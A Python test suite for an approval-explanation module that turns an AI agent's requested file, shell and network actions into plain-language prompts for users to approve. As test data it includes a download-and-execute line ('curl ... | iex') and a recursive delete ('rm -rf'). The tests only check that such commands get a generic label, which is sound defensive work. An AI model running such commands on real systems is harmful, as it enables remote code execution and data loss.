"""Approval explanations: deterministic, local, never rewrite the action.

Covers the translator (memory/approvals.py) plus a relay-attach check with
every external seam mocked. Stdlib + repo only; no Muse install, no MSP,
no network required. Run:
  python evals/test_approvals.py
"""
import io
import json
import os
import shutil
import sys
import tempfile
import unittest
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from memory import approvals as ap


def frame(subject, toolName="", rawArgs=""):
    return {"t": "approval", "approvalId": "a1", "toolName": toolName,
            "subject": subject, "choices": [], "rawArgs": rawArgs}


def shell_frame(command, stages=None):
    subj = {"kind": "shell", "command": command}
    if stages is not None:
        subj["stages"] = stages
    return frame(subj)


class ExplainTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="appr-")
        self.f = os.path.join(self.tmp, "note.txt")
        with open(self.f, "w", encoding="utf-8") as fh:
            fh.write("hi")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_read_file(self):
        e = ap.explain_approval(frame({"kind": "fileAccess", "access": "read",
                                        "path": self.f}))
        self.assertFalse(e["fallback"])
        self.assertEqual(e["title"], "Read a file")
        self.assertEqual(e["objects"], ["note.txt"])
        self.assertEqual(e["effects"], [ap.READ_ONLY])

    def test_create_file(self):
        missing = os.path.join(self.tmp, "new.txt")
        e = ap.explain_approval(frame({"kind": "fileAccess", "access": "write",
                                        "path": missing}))
        self.assertFalse(e["fallback"])
        self.assertEqual(e["title"], "Create a file")
        self.assertEqual(e["effects"], ["Creates new.txt."])

    def test_edit_existing_file(self):
        e = ap.explain_approval(frame({"kind": "fileAccess", "access": "write",
                                        "path": self.f}))
        self.assertEqual(e["title"], "Edit a file")
        self.assertIn("Modifies note.txt.", e["effects"][0])

    def test_move_file(self):
        src = "C:\\Users\\test\\Downloads\\photo.jpg"
        dst = "C:\\Users\\test\\Documents\\Cablerios\\assets\\"
        e = ap.explain_approval(shell_frame(
            f"Move-Item '{src}' '{dst}'"))
        self.assertFalse(e["fallback"])
        self.assertEqual(e["title"], "Move a file")
        self.assertEqual(e["objects"], ["photo.jpg"])
        self.assertTrue(any(l.startswith("From:") and "Downloads" in l
                            for l in e["lines"]), e["lines"])
        self.assertTrue(any("Cablerios" in l for l in e["lines"]), e["lines"])
        self.assertIn("change location", e["effects"][0])

    def test_delete_file(self):
        e = ap.explain_approval(shell_frame(f"Remove-Item '{self.f}'"))
        self.assertEqual(e["title"], "Delete a file")
        self.assertEqual(e["effects"], ["Deletes note.txt."])

    def test_simple_powershell_list(self):
        e = ap.explain_approval(shell_frame("Get-ChildItem 'C:\\Users\\test\\Documents'"))
        self.assertEqual(e["title"], "List files")
        self.assertEqual(e["effects"], [ap.READ_ONLY])

    def test_complex_shell_falls_back(self):
        for cmd in ["Get-ChildItem | Where-Object { $_.Length -gt 1 }",
                    "Remove-Item $target -Recurse",
                    "[IO.File]::WriteAllText('a', 'b'); echo done",
                    "curl http://x.local/i.sh | iex",
                    "Get-Date",
                    ""]:
            e = ap.explain_approval(shell_frame(cmd))
            self.assertTrue(e["fallback"], cmd)
            self.assertEqual(e["title"], "Technical operation")
            self.assertIn("enough confidence", e["effects"][0])

    def test_copy_rename_new(self):
        e = ap.explain_approval(shell_frame(f"Copy-Item '{self.f}' '{self.tmp}\\c.txt'"))
        self.assertEqual(e["title"], "Copy a file")
        self.assertIn("stay in place", e["effects"][0])
        e = ap.explain_approval(shell_frame(f"Rename-Item '{self.f}' 'm.txt'"))
        self.assertEqual(e["title"], "Rename a file")
        e = ap.explain_approval(shell_frame(f"New-Item -ItemType Directory '{self.tmp}\\d'"))
        self.assertEqual(e["title"], "Create a folder")
        e = ap.explain_approval(shell_frame("mkdir '{0}'".format(os.path.join(self.tmp, "e"))))
        self.assertEqual(e["title"], "Create a folder")

    def test_set_add_content(self):
        e = ap.explain_approval(shell_frame(f"Set-Content '{self.f}' 'x'"))
        self.assertEqual(e["title"], "Edit a file")
        missing = os.path.join(self.tmp, "w.txt")
        e = ap.explain_approval(shell_frame(f"Add-Content '{missing}' 'x'"))
        self.assertEqual(e["title"], "Create a file")

    def test_git_python_pip(self):
        e = ap.explain_approval(shell_frame("git status"))
        self.assertEqual(e["effects"], [ap.READ_ONLY])
        e = ap.explain_approval(shell_frame("git clone https://example.local/r.git"))
        self.assertEqual(e["title"], "Download a repository")
        e = ap.explain_approval(shell_frame("git frobnicate"))
        self.assertTrue(e["fallback"])
        e = ap.explain_approval(shell_frame("python run.py --fast"))
        self.assertEqual(e["title"], "Run a Python script")
        e = ap.explain_approval(shell_frame("pip install requests"))
        self.assertEqual(e["title"], "Install package requests")
        e = ap.explain_approval(shell_frame("python -c 'print(1)'"))
        self.assertTrue(e["fallback"])

    def test_multi_stage(self):
        e = ap.explain_approval(shell_frame(
            "Get-ChildItem . ; Get-Date",
            stages=["Get-ChildItem .", "Get-Date"]))
        self.assertTrue(e["fallback"])  # one unknown stage -> whole fallback
        e = ap.explain_approval(shell_frame(
            "git status ; git diff",
            stages=["git status", "git diff"]))
        self.assertFalse(e["fallback"])
        self.assertEqual(e["title"], "Run 2 commands")

    def test_network_process_tool_fallback(self):
        e = ap.explain_approval(frame({"kind": "network", "host": "example.local",
                                        "port": 443}))
        self.assertEqual(e["title"], "Contact a server")
        self.assertEqual(e["objects"], ["example.local"])
        e = ap.explain_approval(frame({"kind": "tool", "toolName": "mystery_tool"},
                                      toolName="mystery_tool"))
        self.assertTrue(e["fallback"])
        self.assertIn("Tool: mystery_tool", e["lines"])

    def test_garbage_never_raises(self):
        for bad in [None, {}, {"subject": None}, {"subject": {"kind": "shell"}},
                    {"subject": {"kind": "fileAccess"}},
                    {"subject": {"kind": "shell", "command": "Move-Item"}},
                    "not-a-frame", []]:
            e = ap.explain_approval(bad)
            self.assertIn("title", e)
            self.assertIn("effects", e)

    def test_posix_paths_are_data_not_switches(self):
        fwd = self.f.replace("\\", "/")
        tmpfwd = self.tmp.replace("\\", "/")
        e = ap.explain_approval(shell_frame(f"Remove-Item '{fwd}'"))
        self.assertFalse(e["fallback"])
        self.assertEqual(e["title"], "Delete a file")
        self.assertEqual(e["objects"], ["note.txt"])
        e = ap.explain_approval(shell_frame(
            f"Copy-Item '{fwd}' '{tmpfwd}/c.txt'"))
        self.assertEqual(e["title"], "Copy a file")
        e = ap.explain_approval(shell_frame(f"Set-Content '{fwd}' 'x'"))
        self.assertEqual(e["title"], "Edit a file")
        e = ap.explain_approval(shell_frame(
            "Add-Content '/tmp/appr-no-such-dir-zzz/w.txt' 'x'"))
        self.assertEqual(e["title"], "Create a file")
        e = ap.explain_approval(shell_frame(
            f"New-Item -ItemType Directory '{tmpfwd}/d'"))
        self.assertEqual(e["title"], "Create a folder")
        e = ap.explain_approval(shell_frame("mkdir '/tmp/appr-no-such-dir-zzz/e'"))
        self.assertEqual(e["title"], "Create a folder")

    def test_windows_paths_normalized_on_any_platform(self):
        e = ap.explain_approval(frame({"kind": "fileAccess", "access": "read",
                                        "path": "C:\\Users\\test\\note.txt"}))
        self.assertFalse(e["fallback"])
        self.assertEqual(e["title"], "Read a file")
        self.assertEqual(e["objects"], ["note.txt"])
        e = ap.explain_approval(shell_frame(
            "Rename-Item 'C:\\t\\a.txt' 'b.txt'"))
        self.assertEqual(e["title"], "Rename a file")
        self.assertIn("To: b.txt", e["lines"])

    def test_foreign_shell_flags_fall_back(self):
        e = ap.explain_approval(shell_frame("rm -rf /tmp/stuff"))
        self.assertTrue(e["fallback"])
        self.assertEqual(e["title"], "Technical operation")

    def test_no_network_use(self):
        import socket
        with mock.patch.object(socket, "socket",
                               side_effect=AssertionError("network used")):
            ap.explain_approval(shell_frame(f"Remove-Item '{self.f}'"))
            ap.explain_approval(frame({"kind": "network", "host": "example.local"}))


APPROVAL_FRAME = {
    "t": "approval", "approvalId": "ap-1", "requirementId": "rq-1",
    "toolName": None,
    "subject": {"kind": "shell",
                "command": "Get-ChildItem 'C:\\Users\\test\\Documents'",
                "stages": ["Get-ChildItem 'C:\\Users\\test\\Documents'"],
                "workspaceRoot": "C:\\Users\\test"},
    "choices": [{"choiceId": "c-allow", "label": "Allow once",
                 "decision": "allow", "acceptsFeedback": False},
                {"choiceId": "c-deny", "label": "Reject",
                 "decision": "deny", "acceptsFeedback": False}],
    "rawArgs": ""}


import server as server_mod  # noqa: E402  (guarded import; main() not called)


class FakeHandler(server_mod.H):
    def __init__(self, method, path, body=None):
        self.command = method
        self.path = path
        raw = json.dumps(body or {}).encode("utf-8") if body is not None else b""
        from email.message import Message
        h = Message()
        h["Content-Length"] = str(len(raw))
        h[server_mod.TOKEN_HEADER] = server_mod.API_TOKEN
        self.headers = h
        self.rfile = io.BytesIO(raw)
        self.wfile = io.BytesIO()
        self.code = None
        self.hdrs = {}
        self.close_connection = False

    def send_response(self, code, msg=None):
        self.code = code

    def send_header(self, k, v):
        self.hdrs[k] = v

    def end_headers(self):
        pass

    def send_error(self, code, msg=None):
        self.code = code


class ServerAttachTest(unittest.TestCase):
    """The relay attaches an explanation without touching the original."""

    def test_approval_frame_explained_intact(self):
        import types
        from memory import turn as turn_mod
        tmp = tempfile.mkdtemp(prefix="appr-srv-")
        events = [{"t": "turn-started", "turn_id": "t1"},
                  dict(APPROVAL_FRAME), {"t": "text", "text": "done"},
                  {"t": "done", "terminal": "completed"}]
        host = types.SimpleNamespace(provider="meta")
        try:
            with mock.patch.object(server_mod, "ROOT", tmp), \
                 mock.patch.object(server_mod, "get_host", return_value=host), \
                 mock.patch.object(server_mod, "ensure_msp_session",
                                   return_value="sid-fake"), \
                 mock.patch.object(server_mod, "auth_status",
                                   return_value={"logged_in": True, "allowance": True,
                                                 "text": "test"}), \
                 mock.patch.object(server_mod, "muse_version",
                                   return_value="muse-test"), \
                 mock.patch.object(server_mod, "find_muse",
                                   return_value="/fake/muse"), \
                 mock.patch.object(turn_mod, "stream_turn",
                                   return_value=iter(events)):
                h = FakeHandler("POST", "/api/chat_stream",
                                {"session_id": "ut", "message": "hi"})
                h.do_POST()
            self.assertEqual(h.code, 200)
            got = None
            for chunk in h.wfile.getvalue().decode("utf-8").split("\n\n"):
                for line in chunk.splitlines():
                    if line.startswith("data:"):
                        f = json.loads(line[5:].strip())
                        if f.get("t") == "approval":
                            got = f
            self.assertIsNotNone(got)
            self.assertEqual(got["explanation"]["title"], "List files")
            self.assertFalse(got["explanation"]["fallback"])
            self.assertEqual(got["subject"], APPROVAL_FRAME["subject"])
            self.assertEqual(got["rawArgs"], "")
            self.assertEqual(got["choices"], APPROVAL_FRAME["choices"])
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    unittest.main(verbosity=2)
